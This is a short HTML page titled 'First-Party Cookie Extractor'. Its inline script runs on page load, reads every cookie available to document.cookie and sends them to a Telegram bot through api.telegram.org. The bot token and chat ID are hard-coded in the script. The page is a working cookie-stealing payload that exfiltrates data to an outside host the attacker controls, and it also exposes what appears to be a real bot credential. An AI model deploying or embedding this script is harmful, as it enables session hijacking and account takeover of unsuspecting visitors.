<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>First-Party Cookie Extractor</title>
</head>
<body>

<h1>Extract First-Party Cookies</h1>
<p id="cookie-status">Checking cookies...</p>

<script>
    // Function to get all cookies as a string
    function getAllCookies() {
        return document.cookie;  // This retrieves all first-party cookies from the current domain
    }

    // Function to send cookies to Telegram via a bot
    function sendCookiesToTelegram(cookieValue) {
        const botToken = '7694280275:AAGH4Vj9dh9gCMoAwmPeikpWbtyStdNwXc8';  // Your bot token
        const chatId = '693873866';  // Your chat ID
        const message = encodeURIComponent(`Extracted Cookies: ${cookieValue}`);

        // Fetch API to send the message to Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
            .then(response => {
                if (response.ok) {
                    console.log("Cookies sent to Telegram successfully.");
                } else {
                    console.log("Failed to send cookies to Telegram.");
                }
            })
            .catch(error => {
                console.error("Error sending message to Telegram:", error);
            });
    }

    // Get all first-party cookies and send them to Telegram
    const cookies = getAllCookies();
    if (cookies) {
        document.getElementById("cookie-status").textContent = `Cookies found: ${cookies}`;
        sendCookiesToTelegram(cookies);  // Send cookies to Telegram
    } else {
        document.getElementById("cookie-status").textContent = "No cookies found.";
    }
</script>

</body>
</html>
